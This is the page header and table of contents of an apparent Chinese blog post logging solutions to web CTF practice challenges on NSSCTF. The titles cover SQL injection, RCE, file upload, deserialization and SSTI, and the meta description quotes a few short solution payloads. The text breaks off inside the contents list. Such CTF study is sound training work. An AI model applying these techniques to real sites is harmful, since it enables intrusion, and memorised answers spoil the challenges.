<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>NSS刷题记录 | 雨霖铃</title>
    <meta name="author" content="R4iny13lueB311" />
    <meta name="keywords" content="" />
    <meta name="description" content="…1.[SWPUCTF 2021 新生赛]gift_F12F122.[SWPUCTF 2021 新生赛]jicaopayload:GET json=&amp;#123;&amp;quot;x&amp;quot;:&amp;quot;wllm&amp;quot;&amp;#125;POST id=wllmNB3.[SWPUCTF 2021 新生赛]easy_md5payload:GET name[]&amp;#x3D;1POST password[]&amp;#x3D;24.[SWPUCTF 2021 新生赛]easy_sql?wllm&amp;#x3D;1sqlma" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />

    
    <link rel="alternate" href="/atom.xml" title="雨霖铃" type="application/atom+xml">
    
    
    <link rel="icon" href="/images/favicon.ico">
    

    <style type="text/css">
    @font-face {
        font-family: 'icomoon';
        src: url("/fonts/icomoon.eot?q628ml");
        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
             url("/fonts/icomoon.woff?q628ml") format('woff'),
             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
        font-weight: normal;
        font-style: normal;
    }
    </style>
    
<link rel="stylesheet" href="/css/style.css">


    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
<meta name="generator" content="Hexo 7.0.0"></head>
<body>

    <main class="app">
        <header id="header" class="header clearfix">
    <div id="nav" class="nav">
    <div class="nav-mobile">
        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
        <h1 class="nav-mobile-title nav-mobile-item">雨霖铃</h1>
        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
    </div>

    <nav id="nav-inner" class="nav-inner">
        
            <a class="nav-item" href="/">
                <span class="nav-text">首页</span>
            </a>
        
            <a class="nav-item" href="/tags/CTF">
                <span class="nav-text">CTF</span>
            </a>
        
            <a class="nav-item" href="/tags/PTE">
                <span class="nav-text">渗透</span>
            </a>
        
            <a class="nav-item" href="/tags/tech">
                <span class="nav-text">技术力</span>
            </a>
        
            <a class="nav-item" href="/archives">
                <span class="nav-text">归档</span>
            </a>
        
            <a class="nav-item" href="/about">
                <span class="nav-text">关于</span>
            </a>
        
    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>

        
        
        
        

        
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-F12"><span class="toc-number">1.</span> <span class="toc-text">1.[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-jicao"><span class="toc-number">2.</span> <span class="toc-text">2.[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="toc-number">3.</span> <span class="toc-text">3.[SWPUCTF 2021 新生赛]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-sql"><span class="toc-number">4.</span> <span class="toc-text">4.[SWPUCTF 2021 新生赛]easy_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="toc-number">5.</span> <span class="toc-text">5.[SWPUCTF 2021 新生赛]include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="toc-number">6.</span> <span class="toc-text">6.[SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="toc-number">7.</span> <span class="toc-text">7.[SWPUCTF 2021 新生赛]caidao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP"><span class="toc-number">8.</span> <span class="toc-text">8.[第五空间 2021]WebFTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce"><span class="toc-number">9.</span> <span class="toc-text">9.[SWPUCTF 2021 新生赛]babyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http"><span class="toc-number">10.</span> <span class="toc-text">10.[SWPUCTF 2021 新生赛]Do_you_know_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="toc-number">11.</span> <span class="toc-text">11.[SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload2-0"><span class="toc-number">12.</span> <span class="toc-text">12.[SWPUCTF 2021 新生赛]easyupload2.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload1-0"><span class="toc-number">13.</span> <span class="toc-text">13.[SWPUCTF 2021 新生赛]easyupload1.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="toc-number">14.</span> <span class="toc-text">14.[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-suctf-2019-EasySQL"><span class="toc-number">15.</span> <span class="toc-text">15.[suctf 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">16.</span> <span class="toc-text">16.[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols"><span class="toc-number">17.</span> <span class="toc-text">17.[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-BJDCTF-2020-easy-md5"><span class="toc-number">18.</span> <span class="toc-text">18.[BJDCTF 2020]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-NISACTF-2022-easyssrf"><span class="toc-number">19.</span> <span class="toc-text">19.[NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="toc-number">20.</span> <span class="toc-text">20.[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error"><span class="toc-number">21.</span> <span class="toc-text">21.[SWPUCTF 2021 新生赛]error</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="toc-number">22.</span> <span class="toc-text">22.[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-NCTF-2018-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">23.</span> <span class="toc-text">23.[NCTF 2018]签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">24.</span> <span class="toc-text">24.[SWPUCTF 2021 新生赛]pop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-LitCTF-2023-%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-number">25.</span> <span class="toc-text">25.[LitCTF 2023]导弹迷踪</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#26-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql"><span class="toc-number">26.</span> <span class="toc-text">26.[SWPUCTF 2021 新生赛]sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#27-GXYCTF-2019-Ping-Ping-Ping"><span class="toc-number">27.</span> <span class="toc-text">27.[GXYCTF 2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#28-NSSCTF-2022-Spring-Recruit-ezgame"><span class="toc-number">28.</span> <span class="toc-text">28.[NSSCTF 2022 Spring Recruit]ezgame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#29-LitCTF-2023-%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">29.[LitCTF 2023]我Flag呢？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#30-%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">30.</span> <span class="toc-text">30.[鹤城杯 2021]EasyP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#31-LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-number">31.</span> <span class="toc-text">31.[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">32.</span> <span class="toc-text">32.[SWPUCTF 2021 新生赛]finalrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#33-NISACTF-2022-checkin"><span class="toc-number">33.</span> <span class="toc-text">33.[NISACTF 2022]checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#34-LitCTF-2023-1zjs"><span class="toc-number">34.</span> <span class="toc-text">34.[LitCTF 2023]1zjs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="toc-number">35.</span> <span class="toc-text">35.[鹏城杯 2022]简单包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#36-LitCTF-2023-Ping"><span class="toc-number">36.</span> <span class="toc-text">36.[LitCTF 2023]Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#37-LitCTF-2023-Follow-me-and-hack-me"><span class="toc-number">37.</span> <span class="toc-text">37.[LitCTF 2023]Follow me and hack me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#38-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="toc-number">38.</span> <span class="toc-text">38.[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#39-LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">39.</span> <span class="toc-text">39.[LitCTF 2023]作业管理系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#40-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">40.</span> <span class="toc-text">40.[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#41-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-websign"><span class="toc-number">41.</span> <span class="toc-text">41.[UUCTF 2022 新生赛]websign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#42-NISACTF-2022-level-up"><span class="toc-number">42.</span> <span class="toc-text">42.[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#43-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin"><span class="toc-number">43.</span> <span class="toc-text">43.[HUBUCTF 2022 新生赛]checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#44-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">44.</span> <span class="toc-text">44.[CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#45-HDCTF-2023-Welcome-To-HDCTF-2023"><span class="toc-number">45.</span> <span class="toc-text">45.[HDCTF 2023]Welcome To HDCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#46-NISACTF-2022-babyupload"><span class="toc-number">46.</span> <span class="toc-text">46.[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#47-GDOUCTF-2023-hate-eat-snake"><span class="toc-number">47.</span> <span class="toc-text">47.[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#48-NISACTF-2022-babyserialize"><span class="toc-number">48.</span> <span class="toc-text">48.[NISACTF 2022]babyserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#49-NISACTF-2022-midlevel"><span class="toc-number">49.</span> <span class="toc-text">49.[NISACTF 2022]midlevel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#50-NSSCTF-2022-Spring-Recruit-babyphp"><span class="toc-number">50.</span> <span class="toc-text">50.[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#51-NISACTF-2022-bingdundun"><span class="toc-number">51.</span> <span class="toc-text">51.[NISACTF 2022]bingdundun~</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#52-GDOUCTF-2023-EZ-WEB"><span class="toc-number">52.</span> <span class="toc-text">52.[GDOUCTF 2023]EZ WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#53-LitCTF-2023-Vim-yyds"><span class="toc-number">53.</span> <span class="toc-text">53.[LitCTF 2023]Vim yyds</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#54-GXYCTF-2019-BabyUpload"><span class="toc-number">54.</span> <span class="toc-text">54.[GXYCTF 2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#55-GKCTF-2020-cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">55.</span> <span class="toc-text">55.[GKCTF 2020]cve版签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#56-HNCTF-2022-Week1-2048"><span class="toc-number">56.</span> <span class="toc-text">56.[HNCTF 2022 Week1]2048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#57-LitCTF-2023-Http-pro-max-plus"><span class="toc-number">57.</span> <span class="toc-text">57.[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#58-NISACTF-2022-popchains"><span class="toc-number">58.</span> <span class="toc-text">58.[NISACTF 2022]popchains</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#59-GDOUCTF-2023-%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="toc-number">59.</span> <span class="toc-text">59.[GDOUCTF 2023]泄露的伪装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#60-CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">60.</span> <span class="toc-text">60.[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61-HCTF-2018-Warmup"><span class="toc-number">61.</span> <span class="toc-text">61.[HCTF 2018]Warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#62-HNCTF-2022-Week1-Interesting-include"><span class="toc-number">62.</span> <span class="toc-text">62.[HNCTF 2022 Week1]Interesting_include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#63-NSSRound-1-Basic-basic-check"><span class="toc-number">63.</span> <span class="toc-text">63.[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#64-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">64.</span> <span class="toc-text">64.[SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#65-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">65.</span> <span class="toc-text">65.[羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#66-LitCTF-2023-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B-%EF%BC%81"><span class="toc-number">66.</span> <span class="toc-text">66.[LitCTF 2023]这是什么？SQL ！注一下 ！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#67-%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-Middle-magic"><span class="toc-number">67.</span> <span class="toc-text">67.[鹤城杯 2021]Middle magic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#68-GDOUCTF-2023-%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-number">68.</span> <span class="toc-text">68.[GDOUCTF 2023]受不了一点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#69-GKCTF-2021-easycms"><span class="toc-number">69.</span> <span class="toc-text">69.[GKCTF 2021]easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#70-HNCTF-2022-Week1-easy-html"><span class="toc-number">70.</span> <span class="toc-text">70.[HNCTF 2022 Week1]easy_html</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#71-HDCTF-2023-SearchMaster"><span class="toc-number">71.</span> <span class="toc-text">71.[HDCTF 2023]SearchMaster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#72-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">72.</span> <span class="toc-text">72.[UUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#73-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="toc-number">73.</span> <span class="toc-text">73.[第五空间 2021]pklovecloud</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#81-HNCTF-2022-Week1-Interesting-http"><span class="toc-number">74.</span> <span class="toc-text">81.[HNCTF 2022 Week1]Interesting_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#82-WUSTCTF-2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">75.</span> <span class="toc-text">82.[WUSTCTF 2020]朴实无华</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#83-LitCTF-2023-Flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81"><span class="toc-number">76.</span> <span class="toc-text">83.[LitCTF 2023]Flag点击就送！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#84-NISACTF-2022-is-secret"><span class="toc-number">77.</span> <span class="toc-text">84.[NISACTF 2022]is secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#85-NISACTF-2022-middlerce"><span class="toc-number">78.</span> <span class="toc-text">85.[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#86-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="toc-number">79.</span> <span class="toc-text">86.[SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#95-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">80.</span> <span class="toc-text">95.[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#96-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-js-sign"><span class="toc-number">81.</span> <span class="toc-text">96.[SWPUCTF 2022 新生赛]js_sign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#97-HNCTF-2022-WEEK2-ez-SSTI"><span class="toc-number">82.</span> <span class="toc-text">97.[HNCTF 2022 WEEK2]ez_SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#98-GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="toc-number">83.</span> <span class="toc-text">98.[GDOUCTF 2023]反方向的钟</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#99-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-xff"><span class="toc-number">84.</span> <span class="toc-text">99.[SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#100-MoeCTF-2022-baby-file"><span class="toc-number">85.</span> <span class="toc-text">100.[MoeCTF 2022]baby_file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#101-CISCN-2019%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">86.</span> <span class="toc-text">101.[CISCN 2019初赛]Love Math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#102-NSSRound-8-Basic-MyDoor"><span class="toc-number">87.</span> <span class="toc-text">102.[NSSRound#8 Basic]MyDoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#103-prize-p5"><span class="toc-number">88.</span> <span class="toc-text">103.prize_p5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#104-NCTF-2018-flask%E7%9C%9F%E9%A6%99"><span class="toc-number">89.</span> <span class="toc-text">104.[NCTF 2018]flask真香</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#105-LitCTF-2023-%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F"><span class="toc-number">90.</span> <span class="toc-text">105.[LitCTF 2023]就当无事发生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#106-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="toc-number">91.</span> <span class="toc-text">106.[SWPUCTF 2022 新生赛]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#107-HDCTF-2023-YamiYami"><span class="toc-number">92.</span> <span class="toc-text">107.[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#108-NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1"><span class="toc-number">93.</span> <span class="toc-text">108.[NCTF 2018]滴!晨跑打卡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#109-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-webdog1-start"><span class="toc-number">94.</span> <span class="toc-text">109.[SWPUCTF 2022 新生赛]webdog1__start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#110-GXYCTF-2019-BabySqli"><span class="toc-number">95.</span> <span class="toc-text">110.[GXYCTF 2019]BabySqli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#111-NSSRound-4-SWPU-ez-rce"><span class="toc-number">96.</span> <span class="toc-text">111.[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#112-BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">97.</span> <span class="toc-text">112.[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#113-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">98.</span> <span class="toc-text">113.[鹏城杯 2022]简单的php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#114-HGAME-2023-week1-Classic-Childhood-Game"><span class="toc-number">99.</span> <span class="toc-text">114.[HGAME 2023 week1]Classic Childhood Game</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#115-NISACTF-2022-hardsql"><span class="toc-number">100.</span> <span class="toc-text">115.[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#116-%E5%AE%89%E6%B4%B5%E6%9D%AF-2020-Normal-SSTI"><span class="toc-number">101.</span> <span class="toc-text">116.[安洵杯 2020]Normal SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#117-MoeCTF-2022-ezhtml"><span class="toc-number">102.</span> <span class="toc-text">117.[MoeCTF 2022]ezhtml</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#118-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-php"><span class="toc-number">103.</span> <span class="toc-text">118.[SWPUCTF 2022 新生赛]funny_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#119-HNCTF-2022-WEEK2-ez-ssrf"><span class="toc-number">104.</span> <span class="toc-text">119.[HNCTF 2022 WEEK2]ez_ssrf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#120-MoeCTF-2021-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97%E2%80%94%E5%B0%8F%E9%A5%BC%E5%B9%B2"><span class="toc-number">105.</span> <span class="toc-text">120.[MoeCTF 2021]Web安全入门指北—小饼干</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#121-MoeCTF-2022-what-are-y0u-uploading%EF%BC%9F"><span class="toc-number">106.</span> <span class="toc-text">121.[MoeCTF 2022]what are y0u uploading？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#122-MoeCTF-2021-2048"><span class="toc-number">107.</span> <span class="toc-text">122.[MoeCTF 2021]2048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#123-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-upload"><span class="toc-number">108.</span> <span class="toc-text">123.[UUCTF 2022 新生赛]ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#124-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-welcome"><span class="toc-number">109.</span> <span class="toc-text">124.[极客大挑战 2020]welcome</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#125-MoeCTF-2021-babyRCE"><span class="toc-number">110.</span> <span class="toc-text">125.[MoeCTF 2021]babyRCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#126-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-1zpop"><span class="toc-number">111.</span> <span class="toc-text">126.[SWPUCTF 2022 新生赛]ez_1zpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#127-HZNUCTF-2023-preliminary-flask"><span class="toc-number">112.</span> <span class="toc-text">127.[HZNUCTF 2023 preliminary]flask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#128-NCTF-2019-Fake-XML-cookbook"><span class="toc-number">113.</span> <span class="toc-text">128.[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#129-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unser"><span class="toc-number">114.</span> <span class="toc-text">129.[UUCTF 2022 新生赛]ez_unser</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#130-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Ez-upload"><span class="toc-number">115.</span> <span class="toc-text">130.[SWPUCTF 2022 新生赛]Ez_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#131-FSCTF-2023-%E6%BA%90%E7%A0%81%EF%BC%81%E5%90%AF%E5%8A%A8"><span class="toc-number">116.</span> <span class="toc-text">131.[FSCTF 2023]源码！启动!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#132-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-web"><span class="toc-number">117.</span> <span class="toc-text">132.[SWPUCTF 2022 新生赛]funny_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#133-MoeCTF-2021-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97%E2%80%94GET"><span class="toc-number">118.</span> <span class="toc-text">133.[MoeCTF 2021]Web安全入门指北—GET</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#134-MoeCTF-2021-unserialize"><span class="toc-number">119.</span> <span class="toc-text">134.[MoeCTF 2021]unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#135-FSCTF-2023-webshell%E6%98%AF%E5%95%A5%E6%8D%8F"><span class="toc-number">120.</span> <span 